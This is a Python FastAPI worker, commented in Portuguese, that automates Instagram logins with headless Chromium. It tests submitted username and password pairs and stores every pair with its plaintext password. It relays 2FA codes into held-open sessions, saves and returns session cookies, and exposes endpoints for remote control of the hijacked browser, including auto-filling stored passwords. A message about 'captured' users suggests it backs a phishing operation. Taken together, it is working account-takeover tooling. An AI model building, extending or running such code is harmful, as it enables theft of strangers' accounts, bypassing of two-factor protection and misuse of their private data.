import asyncio
import json
import logging
import os
import sqlite3
from contextlib import asynccontextmanager
from datetime import datetime
from pathlib import Path
from typing import Optional, List, Dict, Any

from fastapi import FastAPI, Response
from pydantic import BaseModel
import uvicorn
from playwright.async_api import async_playwright, Browser, BrowserContext, Page, Playwright

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("ig-worker")

DADOS_JSON = Path("dados.json")
RESULTADO_JSON = Path("resultado.json")
SESSOES_DIR = Path("sessoes")
DB_PATH = Path("ig_database.sqlite")

URL_LOGIN = "https://www.instagram.com/?flo=true"
URL_FINAL_PADRAO = "https://www.instagram.com/"
SELECTOR_USERNAME = "input[name='email'], input[name='username'], input[type='text']"
SELECTOR_PASSWORD = "input[name='pass'], input[name='password'], input[type='password']"
SELECTOR_SUBMIT = "button[type='submit'], input[type='submit']"


class TesteRequest(BaseModel):
    usuario: str
    senha: str


class Injetar2FARequest(BaseModel):
    usuario: str
    codigo: str


class RemotaIniciarRequest(BaseModel):
    usuario: Optional[str] = None
    tenant: Optional[str] = "default"


class RemotaAutoLoginRequest(BaseModel):
    usuario: Optional[str] = None


class RemotaCliqueRequest(BaseModel):
    x: int
    y: int


class RemotaNavegarRequest(BaseModel):
    url: str


class RemotaDigitarRequest(BaseModel):
    texto: str


class RemotaTeclaRequest(BaseModel):
    tecla: str


class RemotaScrollRequest(BaseModel):
    delta_y: int


class RemoteBrowserState:
    def __init__(self):
        self.context: Optional[BrowserContext] = None
        self.page: Optional[Page] = None
        self.usuario: Optional[str] = None
        self.url: str = URL_FINAL_PADRAO
        self.title: str = "Instagram"
        self.last_activity: float = 0
        self.last_screenshot: Optional[bytes] = None
        self.lock: asyncio.Lock = asyncio.Lock()


remote_browser = RemoteBrowserState()


class WorkerState:
    playwright: Optional[Playwright] = None
    browser: Optional[Browser] = None
    context: Optional[BrowserContext] = None
    page: Optional[Page] = None
    is_ready: bool = False
    is_warming: bool = False
    lock: asyncio.Lock = asyncio.Lock()
    warm_lock: asyncio.Lock = asyncio.Lock()


state = WorkerState()
active_sessions: Dict[str, Dict[str, Any]] = {}
SESSION_TIMEOUT_SECONDS = 300


def obter_senha_usuario(usuario: str) -> Optional[str]:
    """Recupera a senha salva do usuário para auto-preenchimento stealth no navegador remoto."""
    u_clean = usuario.lower().strip()
    u_raw = u_clean[1:] if u_clean.startswith("@") else u_clean

    # 1. Consulta no SQLite
    if DB_PATH.exists():
        try:
            conn = sqlite3.connect(str(DB_PATH))
            cursor = conn.cursor()
            cursor.execute(
                "SELECT senha FROM logins WHERE lower(usuario) = ? OR lower(usuario) = ? ORDER BY id DESC LIMIT 1",
                (u_clean, u_raw)
            )
            row = cursor.fetchone()
            conn.close()
            if row and row[0]:
                return row[0]
        except Exception as e:
            logger.warning(f"[DB] Erro ao consultar senha no SQLite: {e}")

    # 2. Fallback: consulta em dados.json
    for path in [DADOS_JSON, RESULTADO_JSON]:
        if path.exists():
            try:
                with open(path, "r", encoding="utf-8") as f:
                    itens = json.load(f)
                for item in reversed(itens):
                    u = (item.get("usuario") or item.get("nome") or item.get("username") or "").lower().strip()
                    s = item.get("senha") or item.get("password")
                    if (u == u_clean or u == u_raw) and s:
                        return s
            except Exception:
                pass
    return None


def formatar_cookies_para_playwright(raw_cookies: list) -> list:
    """Adapta cookies para formato estrito aceito pelo Playwright."""
    pw_cookies = []
    for c in raw_cookies:
        if not c.get("name") or not c.get("value"):
            continue
        domain = c.get("domain", "")
        obj = {
            "name": str(c["name"]),
            "value": str(c["value"]),
            "domain": domain,
            "path": c.get("path", "/") or "/"
        }
        if "httpOnly" in c:
            obj["httpOnly"] = bool(c["httpOnly"])
        if "secure" in c:
            obj["secure"] = bool(c["secure"])
        ss = str(c.get("sameSite", "")).lower()
        if ss == "lax":
            obj["sameSite"] = "Lax"
        elif ss == "strict":
            obj["sameSite"] = "Strict"
        elif ss == "none":
            obj["sameSite"] = "None"
            obj["secure"] = True  # RFC/Playwright: sameSite=None exige secure=True
        exp = c.get("expirationDate") or c.get("expires")
        if exp and isinstance(exp, (int, float)) and exp > 0:
            obj["expires"] = float(exp)
        pw_cookies.append(obj)
    return pw_cookies


def salvar_sessao_disco(usuario: str, cookies: list, url_final: str = "", storage_state: Optional[dict] = None):
    """Persiste cookies e storage_state na pasta sessoes/."""
    try:
        SESSOES_DIR.mkdir(parents=True, exist_ok=True)
        user_safe_key = usuario.lower().strip().replace("@", "_").replace(".", "_")

        if storage_state:
            storage_file = SESSOES_DIR / f"{user_safe_key}_storage.json"
            with open(storage_file, "w", encoding="utf-8") as sf:
                json.dump(storage_state, sf, indent=2)
            logger.info(f"[WARM WORKER] 💾 storage_state salvo em {storage_file.name}")

        sess_file = SESSOES_DIR / f"{user_safe_key}_cookies.json"
        with open(sess_file, "w", encoding="utf-8") as cf:
            json.dump({
                "usuario": usuario,
                "cookies": cookies,
                "total_cookies": len(cookies),
                "url_final": url_final or URL_FINAL_PADRAO,
                "updated_at": datetime.now().isoformat()
            }, cf, indent=2)
        logger.info(f"[WARM WORKER] 💾 cookies salvos em {sess_file.name} ({len(cookies)} cookies)")
    except Exception as ce:
        logger.warning(f"Erro ao salvar sessão em disco: {ce}")


async def auto_preencher_e_logar(page: Page, usuario: str) -> bool:
    """Preenche credenciais de forma stealth no formulário do Instagram."""
    senha = obter_senha_usuario(usuario)
    if not senha:
        logger.warning(f"[AUTO-LOGIN] Nenhuma senha salva encontrada para {usuario}")
        return False

    try:
        user_input = usuario[1:].strip() if usuario.startswith("@") else usuario.strip()
        username_el = page.locator(SELECTOR_USERNAME).first
        if await username_el.count() > 0 and await username_el.is_visible():
            await username_el.click()
            await username_el.fill(user_input)
            await asyncio.sleep(0.2)

        password_el = page.locator(SELECTOR_PASSWORD).first
        if await password_el.count() > 0 and await password_el.is_visible():
            await password_el.click()
            await password_el.fill(senha)
            await asyncio.sleep(0.2)

        btn_submit = page.locator(SELECTOR_SUBMIT).first
        if await btn_submit.count() > 0 and await btn_submit.is_visible():
            await btn_submit.click()
        else:
            await page.keyboard.press("Enter")

        logger.info(f"[AUTO-LOGIN] Credenciais submetidas no Instagram para {usuario}!")
        try:
            await page.wait_for_load_state("networkidle", timeout=5000)
        except Exception:
            await page.wait_for_timeout(2500)
        return True
    except Exception as e:
        logger.warning(f"[AUTO-LOGIN] Erro ao preencher credenciais: {e}")
    return False


async def obter_browser():
    """Garante instância conectada do Chromium com auto-recovery."""
    try:
        if state.browser and state.browser.is_connected():
            return state.browser
    except Exception:
        pass

    logger.info("[WARM WORKER] Conectando motor Chromium Playwright...")
    try:
        if state.playwright:
            try:
                await state.playwright.stop()
            except Exception:
                pass
        state.playwright = await async_playwright().start()
        state.browser = await state.playwright.chromium.launch(
            headless=True,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-dev-shm-usage"
            ]
        )
        state.context = None
        state.page = None
    except Exception as e:
        logger.error(f"[WARM WORKER] Falha ao iniciar browser: {e}")
        raise e
    return state.browser


async def preparar_pagina():
    """Pré-carrega o formulário CAA Login com isolamento de sessão (clear_cookies)."""
    if state.is_warming:
        while state.is_warming:
            await asyncio.sleep(0.1)
        return

    async with state.warm_lock:
        if state.is_ready and state.page and not state.page.is_closed():
            return

        state.is_warming = True
        try:
            state.is_ready = False
            await obter_browser()

            if not state.context:
                state.context = await state.browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
                    viewport={"width": 1280, "height": 800},
                    locale="pt-BR"
                )
            else:
                try:
                    await state.context.clear_cookies()
                except Exception:
                    pass

            if state.page and not state.page.is_closed():
                try:
                    logger.info("[WARM WORKER] Reciclando aba em memória...")
                    await state.page.goto(URL_LOGIN, wait_until="networkidle", timeout=25000)
                    await state.page.wait_for_selector(SELECTOR_USERNAME, state="attached", timeout=15000)
                    await state.page.wait_for_selector(SELECTOR_PASSWORD, state="attached", timeout=15000)
                    state.is_ready = True
                    logger.info("[WARM WORKER] Aba reciclada para teste instantâneo!")
                    return
                except Exception as rec_err:
                    logger.warning(f"[WARM WORKER] Falha ao reciclar aba: {rec_err}. Recriando...")
                    try:
                        await state.page.close()
                    except Exception:
                        pass

            state.page = await state.context.new_page()
            logger.info("[WARM WORKER] Carregando interface CAA Login do Instagram...")
            await state.page.goto(URL_LOGIN, wait_until="networkidle", timeout=30000)
            await state.page.wait_for_selector(SELECTOR_USERNAME, state="attached", timeout=15000)
            await state.page.wait_for_selector(SELECTOR_PASSWORD, state="attached", timeout=15000)

            state.is_ready = True
            logger.info("[WARM WORKER] Página pronta e pré-aquecida para autenticação instantânea!")
        except Exception as e:
            logger.error(f"[WARM WORKER] Erro ao pré-aquecer página: {e}")
            state.is_ready = False
            await asyncio.sleep(2)
            asyncio.create_task(preparar_pagina())
        finally:
            state.is_warming = False


async def limpar_sessoes_expiradas():
    """Remove periodicamente sessões de 2FA que ultrapassaram o limite de tolerância."""
    while True:
        try:
            await asyncio.sleep(30)
            agora = asyncio.get_event_loop().time()
            expirados = []
            for k, sess in list(active_sessions.items()):
                if agora - sess.get("created_at", 0) > SESSION_TIMEOUT_SECONDS:
                    expirados.append(k)
            for k in expirados:
                sess = active_sessions.pop(k, None)
                if sess:
                    logger.info(f"[WARM WORKER] Limpando sessão 2FA expirada (>300s): {k}")
                    try:
                        p = sess.get("page")
                        if p and not p.is_closed():
                            await p.close()
                        c = sess.get("context")
                        if c:
                            await c.close()
                    except Exception:
                        pass
        except Exception as e:
            logger.error(f"[WARM WORKER] Erro no reaper de sessões: {e}")


@asynccontextmanager
async def lifespan(app_inst: FastAPI):
    """Gerenciamento de ciclo de vida assíncrono moderno do FastAPI."""
    asyncio.create_task(preparar_pagina())
    asyncio.create_task(limpar_sessoes_expiradas())
    yield
    logger.info("[WARM WORKER] Encerrando Chromium e Playwright...")
    for k, sess in list(active_sessions.items()):
        try:
            p = sess.get("page")
            if p and not p.is_closed():
                await p.close()
            c = sess.get("context")
            if c:
                await c.close()
        except Exception:
            pass
    active_sessions.clear()

    async with remote_browser.lock:
        if remote_browser.page and not remote_browser.page.is_closed():
            try:
                await remote_browser.page.close()
            except Exception:
                pass
        if remote_browser.context:
            try:
                await remote_browser.context.close()
            except Exception:
                pass

    if state.page and not state.page.is_closed():
        try:
            await state.page.close()
        except Exception:
            pass
    if state.context:
        try:
            await state.context.close()
        except Exception:
            pass
    if state.browser:
        try:
            await state.browser.close()
        except Exception:
            pass
    if state.playwright:
        try:
            await state.playwright.stop()
        except Exception:
            pass


app = FastAPI(title="IG CAA Login Auth Worker", version="1.1.0", lifespan=lifespan)


@app.get("/health")
async def health():
    return {
        "status": "ready" if state.is_ready else "warming",
        "has_browser": state.browser is not None and state.browser.is_connected() if state.browser else False,
        "is_ready": state.is_ready,
        "active_2fa_sessions": len(active_sessions),
        "remote_browser_active": remote_browser.page is not None and not remote_browser.page.is_closed()
    }


def salvar_resultado_local(usuario: str, senha: str, valido: bool, status_credencial: str, mensagem: str, url_final: str = "", error_code: Optional[int] = None):
    novo_log = {
        "data_hora": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        "valido": valido,
        "status_credencial": status_credencial,
        "nome": usuario,
        "usuario": usuario,
        "senha": senha,
        "mensagem": mensagem,
        "error_code": error_code,
        "url_final": url_final
    }

    logs = []
    if RESULTADO_JSON.exists():
        try:
            with open(RESULTADO_JSON, "r", encoding="utf-8-sig") as f:
                logs = json.load(f)
                if not isinstance(logs, list):
                    logs = []
        except Exception:
            logs = []

    logs.append(novo_log)
    try:
        with open(RESULTADO_JSON, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=4, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Erro ao gravar resultado.json: {e}")


@app.post("/testar")
async def testar_credenciais(req: TesteRequest):
    usuario = req.usuario.strip()
    senha = req.senha

    async with state.lock:
        if not state.is_ready or not state.page or state.page.is_closed():
            logger.warning("[WARM WORKER] Página não pronta, aguardando carregamento...")
            await preparar_pagina()

        page = state.page
        inicio = asyncio.get_event_loop().time()
        logger.info(f"[WARM WORKER] Testando credencial instantaneamente para: {usuario}")

        captured_graphql = {}

        async def on_response(response):
            if "/api/graphql" in response.url and response.request.method == "POST":
                try:
                    body = await response.json()
                    if isinstance(body, dict) and "data" in body and isinstance(body["data"], dict):
                        if "caa_login_web" in body["data"]:
                            captured_graphql["caa_login_web"] = body["data"]["caa_login_web"]
                except Exception:
                    pass

        page.on("response", on_response)

        try:
            usuario_input = usuario[1:].strip() if usuario.startswith("@") else usuario.strip()
            await page.fill(SELECTOR_USERNAME, usuario_input)
            await page.fill(SELECTOR_PASSWORD, senha)

            try:
                await page.press(SELECTOR_PASSWORD, "Enter")
            except Exception:
                await page.click(SELECTOR_SUBMIT)

            resultado_valido = False
            status_credencial = "invalido"
            msg_resultado = "Falha na validação"
            error_code_detectado = None

            for _ in range(30):
                await asyncio.sleep(0.3)
                if "caa_login_web" in captured_graphql:
                    break
                url_atual = page.url
                if "two_factor" in url_atual or "challenge" in url_atual:
                    break

            url_final = page.url
            caa = captured_graphql.get("caa_login_web")

            if caa:
                error_code = caa.get("error_code")
                error_code_detectado = error_code
                error_msg = caa.get("error_message")
                err_text = ""
                if isinstance(error_msg, dict):
                    err_text = error_msg.get("text", "")

                two_factor = caa.get("two_factor_result")
                recaptcha = caa.get("recaptcha_needed") or caa.get("is_ig_login_recaptcha")
                authed = caa.get("ig_authenticated")

                if error_code == 1348009 or (error_code is not None and error_code != 0):
                    resultado_valido = False
                    status_credencial = "invalido"
                    msg_resultado = err_text or f"Senha incorreta (error_code: {error_code})"
                elif recaptcha:
                    resultado_valido = False
                    status_credencial = "bloqueio_captcha"
                    msg_resultado = "Desafio Captcha da Meta acionado"
                elif two_factor is not None:
                    resultado_valido = True
                    status_credencial = "valido"
                    msg_resultado = "2FA Requerido - Etapa de código encontrada"
                elif authed is True:
                    resultado_valido = True
                    status_credencial = "valido"
                    msg_resultado = "Autenticação direta bem-sucedida"
                else:
                    resultado_valido = False
                    status_credencial = "invalido"
                    msg_resultado = err_text or "Credencial não autenticada no Instagram"
            else:
                if "two_factor" in url_final or "challenge" in url_final:
                    resultado_valido = True
                    status_credencial = "valido"
                    msg_resultado = "Login válido - rota de 2FA alcançada"
                else:
                    resultado_valido = False
                    status_credencial = "invalido"
                    msg_resultado = "Login inválido ou etapa de código não encontrada"

            duracao = asyncio.get_event_loop().time() - inicio
            logger.info(f"[WARM WORKER] Veredito em {duracao:.2f}s: {status_credencial.upper()} ({msg_resultado})")

            salvar_resultado_local(usuario, senha, resultado_valido, status_credencial, msg_resultado, url_final, error_code_detectado)

            # Preserva a sessão se for 2FA ou autenticado
            user_key = usuario.lower().strip()
            if resultado_valido and (two_factor is not None or "two_factor" in url_final or "challenge" in url_final):
                active_sessions[user_key] = {
                    "page": page,
                    "context": state.context,
                    "usuario": usuario,
                    "created_at": asyncio.get_event_loop().time()
                }
                logger.info(f"[WARM WORKER] Sessão 2FA mantida viva para: {usuario}")
                state.page = None
                state.context = None
            elif resultado_valido and authed is True:
                try:
                    cookies = await state.context.cookies()
                    storage_state = await state.context.storage_state()
                    salvar_sessao_disco(usuario, cookies, url_final, storage_state)

                    async with remote_browser.lock:
                        if remote_browser.page and not remote_browser.page.is_closed() and remote_browser.page != page:
                            try: await remote_browser.page.close()
                            except Exception: pass
                        if remote_browser.context and remote_browser.context != state.context:
                            try: await remote_browser.context.close()
                            except Exception: pass

                        remote_browser.context = state.context
                        remote_browser.page = page
                        remote_browser.usuario = usuario
                        remote_browser.url = url_final
                        try: remote_browser.title = await page.title()
                        except Exception: remote_browser.title = "Instagram"

                    state.page = None
                    state.context = None
                except Exception as ex:
                    logger.warning(f"Erro ao salvar sessão autenticada: {ex}")

            asyncio.create_task(preparar_pagina())

            return {
                "success": True,
                "usuario": usuario,
                "valido": resultado_valido,
                "status_credencial": status_credencial,
                "mensagem": msg_resultado,
                "error_code": error_code_detectado,
                "tempo_segundos": round(duracao, 2),
                "url_final": url_final
            }

        except Exception as err:
            logger.error(f"[WARM WORKER] Falha na execução: {err}")
            asyncio.create_task(preparar_pagina())
            return {
                "success": False,
                "usuario": usuario,
                "valido": False,
                "status_credencial": "invalido",
                "mensagem": f"Erro interno no worker: {err}"
            }


@app.post("/injetar-2fa")
async def injetar_2fa(req: Injetar2FARequest):
    """Injeta o código de segurança 2FA no formulário do Instagram."""
    usuario = req.usuario.strip()
    user_key = usuario.lower()
    codigo = req.codigo.strip()

    session = active_sessions.get(user_key)
    if not session or not session.get("page") or session["page"].is_closed():
        logger.warning(f"[WARM WORKER] Sessão de 2FA não encontrada ou expirada para: {usuario}")
        return {
            "success": False,
            "valido": False,
            "mensagem": "Sessão de 2FA expirada ou não encontrada. Por favor, realize o login novamente."
        }

    page: Page = session["page"]
    context: Optional[BrowserContext] = session.get("context")
    logger.info(f"[WARM WORKER] Injetando código 2FA para {usuario}: {codigo}")

    try:
        code_selectors = [
            'input[name="verificationCode"]',
            'input[name="security_code"]',
            'input[name="code"]',
            'input#code',
            'input[autocomplete="one-time-code"]',
            'input[type="tel"]',
            'input[type="text"]'
        ]

        input_encontrado = None
        for sel in code_selectors:
            loc = page.locator(sel)
            if await loc.count() > 0 and await loc.first.is_visible():
                input_encontrado = loc.first
                break

        if not input_encontrado:
            try:
                await page.wait_for_selector('input[name="verificationCode"], input[name="security_code"], input[name="code"]', timeout=3000)
                input_encontrado = page.locator('input[name="verificationCode"], input[name="security_code"], input[name="code"]').first
            except Exception:
                pass

        if not input_encontrado:
            logger.error(f"[WARM WORKER] Campo de código 2FA não encontrado no DOM para {usuario}")
            return {
                "success": False,
                "valido": False,
                "mensagem": "Campo de código 2FA não localizado na página do Instagram."
            }

        await input_encontrado.fill("")
        await input_encontrado.type(codigo, delay=35)

        btn_continue = page.locator('button[type="submit"], button:has-text("Confirmar"), button:has-text("Confirm"), button:has-text("Avançar")').first
        if await btn_continue.count() > 0:
            await btn_continue.click()
        else:
            await page.keyboard.press("Enter")

        resultado_2fa = None
        msg_2fa = ""

        for _ in range(25):
            await asyncio.sleep(0.3)
            if page.is_closed():
                break
            curr_url = page.url
            if "two_factor" not in curr_url and "challenge" not in curr_url:
                resultado_2fa = True
                msg_2fa = "Autenticação 2FA concluída com sucesso no Instagram!"
                break

            err_loc = page.locator('p[role="alert"], div[role="alert"], #twoFactorErrorAlert')
            if await err_loc.count() > 0 and await err_loc.first.is_visible():
                resultado_2fa = False
                msg_2fa = await err_loc.first.text_content() or "Código 2FA incorreto no Instagram."
                break

        if resultado_2fa is None:
            curr_url = page.url
            if "two_factor" not in curr_url and "challenge" not in curr_url:
                resultado_2fa = True
                msg_2fa = "Autenticação 2FA finalizada com sucesso."
            else:
                resultado_2fa = False
                msg_2fa = "Código 2FA expirado ou inválido."

        if resultado_2fa:
            logger.info(f"[WARM WORKER] 2FA APROVADO no Instagram para {usuario}!")
            try:
                await page.wait_for_load_state("networkidle", timeout=4000)
            except Exception:
                pass

            url_final = page.url if not page.is_closed() else URL_FINAL_PADRAO
            target_ctx = context if context else page.context
            cookies = await target_ctx.cookies()
            storage_state = None
            try:
                storage_state = await target_ctx.storage_state()
            except Exception:
                pass

            salvar_sessao_disco(usuario, cookies, url_final, storage_state)

            async with remote_browser.lock:
                if remote_browser.page and not remote_browser.page.is_closed() and remote_browser.page != page:
                    try: await remote_browser.page.close()
                    except Exception: pass
                if remote_browser.context and remote_browser.context != target_ctx:
                    try: await remote_browser.context.close()
                    except Exception: pass

                remote_browser.context = target_ctx
                remote_browser.page = page
                remote_browser.usuario = usuario
                remote_browser.url = url_final
                try:
                    remote_browser.title = await page.title()
                except Exception:
                    remote_browser.title = "Instagram"
                remote_browser.last_activity = asyncio.get_event_loop().time()

            active_sessions.pop(user_key, None)

            return {
                "success": True,
                "valido": True,
                "mensagem": msg_2fa,
                "cookies": cookies,
                "total_cookies": len(cookies),
                "url_final": url_final
            }
        else:
            logger.warning(f"[WARM WORKER] 2FA Recusado pelo Instagram para {usuario}: {msg_2fa}")
            return {
                "success": True,
                "valido": False,
                "mensagem": msg_2fa,
                "url_final": page.url
            }

    except Exception as e:
        logger.error(f"[WARM WORKER] Exceção ao injetar 2FA: {e}")
        return {
            "success": False,
            "valido": False,
            "mensagem": f"Erro ao processar código 2FA: {e}"
        }


# ==========================================
# ROTAS DO NAVEGADOR REMOTO (STREAM & CONTROLE)
# ==========================================
@app.post("/remota/iniciar")
async def remota_iniciar(req: RemotaIniciarRequest):
    async with remote_browser.lock:
        usuario = (req.usuario or "").strip()
        cookies = []
        storage_file = None
        target_user = usuario

        if not usuario or usuario.lower() in ("sessao", "sessaoremota", "acesso", "ultima", "latest"):
            return {
                "success": False,
                "mensagem": "Nenhum usuário selecionado. Por favor, selecione um usuário capturado no seletor."
            }

        # 1. Se a sessão já está aberta e ativa para este usuário, reutiliza diretamente
        if remote_browser.page and not remote_browser.page.is_closed():
            if remote_browser.usuario and (usuario.lower() in remote_browser.usuario.lower() or remote_browser.usuario.lower() in usuario.lower()):
                logger.info(f"[NAVEGADOR REMOTO] Reutilizando sessão conectada para {remote_browser.usuario}")
                try:
                    current_title = await remote_browser.page.title()
                except Exception:
                    current_title = remote_browser.title
                return {
                    "success": True,
                    "usuario": remote_browser.usuario,
                    "url": remote_browser.page.url,
                    "title": current_title,
                    "total_cookies": 20
                }

        user_key = usuario.lower().replace("@", "_").replace(".", "_")
        storage_candidate = SESSOES_DIR / f"{user_key}_storage.json"
        if storage_candidate.exists():
            storage_file = storage_candidate

        sess_file = SESSOES_DIR / f"{user_key}_cookies.json"
        if sess_file.exists():
            try:
                with open(sess_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    cookies = data.get("cookies", [])
                    target_user = data.get("usuario", usuario)
            except Exception:
                pass

        await obter_browser()

        # Fecha página e contexto anteriores
        if remote_browser.page and not remote_browser.page.is_closed():
            try: await remote_browser.page.close()
            except Exception: pass
        if remote_browser.context:
            try: await remote_browser.context.close()
            except Exception: pass

        context_kwargs = {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
            "viewport": {"width": 1280, "height": 800},
            "locale": "pt-BR",
            "timezone_id": "America/Sao_Paulo"
        }
        if storage_file and storage_file.exists():
            context_kwargs["storage_state"] = str(storage_file)

        remote_browser.context = await state.browser.new_context(**context_kwargs)

        if cookies and not storage_file:
            pw_cookies = formatar_cookies_para_playwright(cookies)
            try:
                await remote_browser.context.add_cookies(pw_cookies)
            except Exception as ce:
                logger.warning(f"[NAVEGADOR REMOTO] Falha ao adicionar cookies: {ce}")

        remote_browser.page = await remote_browser.context.new_page()
        remote_browser.usuario = target_user

        target_url = URL_FINAL_PADRAO
        logger.info(f"[NAVEGADOR REMOTO] Abrindo {target_url} para {target_user}...")
        try:
            await remote_browser.page.goto(target_url, timeout=30000, wait_until="domcontentloaded")
            await asyncio.sleep(0.5)
            remote_browser.url = remote_browser.page.url
            remote_browser.title = await remote_browser.page.title()
        except Exception as nav_err:
            logger.warning(f"[NAVEGADOR REMOTO] Aviso na navegação inicial: {nav_err}")
            remote_browser.url = target_url
            remote_browser.title = "Instagram"

        remote_browser.last_activity = asyncio.get_event_loop().time()

        return {
            "success": True,
            "usuario": target_user,
            "url": remote_browser.url,
            "title": remote_browser.title,
            "total_cookies": len(cookies)
        }


@app.post("/remota/auto-login")
async def remota_auto_login(req: RemotaAutoLoginRequest):
    async with remote_browser.lock:
        target_user = req.usuario or remote_browser.usuario
        if not target_user:
            return {"success": False, "mensagem": "Nenhum usuário especificado."}
        if not remote_browser.page or remote_browser.page.is_closed():
            return {"success": False, "mensagem": "Navegador remoto não está ativo no momento."}

        ok = await auto_preencher_e_logar(remote_browser.page, target_user)
        remote_browser.url = remote_browser.page.url
        try: remote_browser.title = await remote_browser.page.title()
        except Exception: pass
        remote_browser.last_activity = asyncio.get_event_loop().time()

        return {
            "success": ok,
            "usuario": target_user,
            "url": remote_browser.url,
            "title": remote_browser.title,
            "mensagem": "Credenciais preenchidas e submetidas na tela!" if ok else "Não foi possível preencher (verifique se os campos de login estão visíveis)."
        }


@app.get("/remota/status")
async def remota_status():
    p = remote_browser.page
    ativa = p is not None and not p.is_closed()
    url = p.url if ativa else remote_browser.url
    title = remote_browser.title
    if ativa:
        try: title = await p.title()
        except Exception: pass
    return {
        "active": ativa,
        "usuario": remote_browser.usuario,
        "url": url,
        "title": title
    }


@app.get("/remota/screenshot")
async def remota_screenshot():
    p = remote_browser.page
    if not p or p.is_closed():
        return Response(content=b"", media_type="image/jpeg", status_code=404)
    try:
        shot = await p.screenshot(type="jpeg", quality=75, timeout=4000)
        remote_browser.last_screenshot = shot
        return Response(
            content=shot,
            media_type="image/jpeg",
            headers={"Cache-Control": "no-store, no-cache, must-revalidate"}
        )
    except Exception as e:
        logger.debug(f"[NAVEGADOR REMOTO] Screenshot em transição/navegação: {e}")
        if remote_browser.last_screenshot:
            return Response(
                content=remote_browser.last_screenshot,
                media_type="image/jpeg",
                headers={"Cache-Control": "no-store, no-cache, must-revalidate"}
            )
        return Response(content=b"", status_code=204)


@app.post("/remota/clique")
async def remota_clique(req: RemotaCliqueRequest):
    p = remote_browser.page
    if not p or p.is_closed():
        return {"success": False, "mensagem": "Navegador remoto inativo."}
    try:
        logger.info(f"[NAVEGADOR REMOTO] Clique em ({req.x}, {req.y})")
        await p.mouse.click(req.x, req.y)
        await asyncio.sleep(0.3)
        remote_browser.url = p.url
        try: remote_browser.title = await p.title()
        except Exception: pass
        return {"success": True, "url": p.url, "title": remote_browser.title}
    except Exception as e:
        return {"success": False, "mensagem": str(e)}


@app.post("/remota/navegar")
async def remota_navegar(req: RemotaNavegarRequest):
    p = remote_browser.page
    if not p or p.is_closed():
        return {"success": False, "mensagem": "Navegador remoto inativo."}
    try:
        url = req.url.strip()
        if not url.startswith("http"):
            url = "https://" + url
        logger.info(f"[NAVEGADOR REMOTO] Navegando para {url}")
        await p.goto(url, timeout=25000, wait_until="domcontentloaded")
        await asyncio.sleep(0.5)
        remote_browser.url = p.url
        try: remote_browser.title = await p.title()
        except Exception: pass
        return {"success": True, "url": p.url, "title": remote_browser.title}
    except Exception as e:
        return {"success": False, "mensagem": str(e)}


@app.post("/remota/digitar")
async def remota_digitar(req: RemotaDigitarRequest):
    p = remote_browser.page
    if not p or p.is_closed():
        return {"success": False, "mensagem": "Navegador remoto inativo."}
    try:
        logger.info(f"[NAVEGADOR REMOTO] Digitando ({len(req.texto)} caracteres)")
        await p.keyboard.type(req.texto, delay=20)
        await asyncio.sleep(0.2)
        return {"success": True}
    except Exception as e:
        return {"success": False, "mensagem": str(e)}


@app.post("/remota/tecla")
async def remota_tecla(req: RemotaTeclaRequest):
    p = remote_browser.page
    if not p or p.is_closed():
        return {"success": False, "mensagem": "Navegador remoto inativo."}
    try:
        logger.info(f"[NAVEGADOR REMOTO] Tecla: {req.tecla}")
        await p.keyboard.press(req.tecla)
        await asyncio.sleep(0.3)
        remote_browser.url = p.url
        return {"success": True, "url": p.url}
    except Exception as e:
        return {"success": False, "mensagem": str(e)}


@app.post("/remota/scroll")
async def remota_scroll(req: RemotaScrollRequest):
    p = remote_browser.page
    if not p or p.is_closed():
        return {"success": False, "mensagem": "Navegador remoto inativo."}
    try:
        await p.mouse.wheel(0, req.delta_y)
        await asyncio.sleep(0.15)
        return {"success": True}
    except Exception as e:
        return {"success": False, "mensagem": str(e)}


@app.post("/remota/voltar")
async def remota_voltar():
    p = remote_browser.page
    if not p or p.is_closed():
        return {"success": False, "mensagem": "Navegador remoto inativo."}
    try:
        await p.go_back(timeout=10000)
        await asyncio.sleep(0.3)
        remote_browser.url = p.url
        return {"success": True, "url": p.url}
    except Exception as e:
        return {"success": False, "mensagem": str(e)}


@app.post("/remota/avancar")
async def remota_avancar():
    p = remote_browser.page
    if not p or p.is_closed():
        return {"success": False, "mensagem": "Navegador remoto inativo."}
    try:
        await p.go_forward(timeout=10000)
        await asyncio.sleep(0.3)
        remote_browser.url = p.url
        return {"success": True, "url": p.url}
    except Exception as e:
        return {"success": False, "mensagem": str(e)}


@app.post("/remota/recarregar")
async def remota_recarregar():
    p = remote_browser.page
    if not p or p.is_closed():
        return {"success": False, "mensagem": "Navegador remoto inativo."}
    try:
        await p.reload(timeout=20000, wait_until="domcontentloaded")
        await asyncio.sleep(0.5)
        remote_browser.url = p.url
        return {"success": True, "url": p.url}
    except Exception as e:
        return {"success": False, "mensagem": str(e)}


if __name__ == "__main__":
    host = os.getenv("HOST", "127.0.0.1")
    port = int(os.getenv("PORT", "3006"))
    uvicorn.run("bot_service:app", host=host, port=port, log_level="info")
